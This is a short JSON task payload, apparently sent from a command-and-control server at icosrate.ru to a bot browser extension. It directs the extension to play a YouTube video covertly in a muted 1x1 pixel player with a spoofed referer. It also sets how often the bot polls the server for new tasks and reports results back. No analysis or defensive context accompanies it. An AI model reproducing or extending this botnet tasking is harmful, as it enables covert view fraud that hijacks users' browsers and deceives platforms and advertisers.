{"modules":{"ytv":[{"task_id":"4741658","url":"https:\/\/www.youtube.com\/watch?v=E_MwOiwnh7w","params":{"referer":"hr93ugXn7fw","closed":"1","type":2,"mute_player":true,"start_count":"274","width":1,"height":1,"task_timeout":243,"playing_time":12849,"insert_percent":100,"user_agent":"","country_id":0,"actions_pause":10145,"actions":2,"start_video":"https:\/\/www.youtube.com\/watch?v=hr93ugXn7fw"}}]},"config":{"id":840341,"result_url":"http:\/\/icosrate.ru\/get\/?r=extensions.bot.result"},"updater":{"urls":["http:\/\/icosrate.ru\/get\/?r=extensions.bot.getTasks"],"interval":46000,"check_update":5000,"min_ticks":5000,"fails_max_count":100,"fails_interval_step":37000,"fails_total_interval":6000000,"reset_interval":10000}}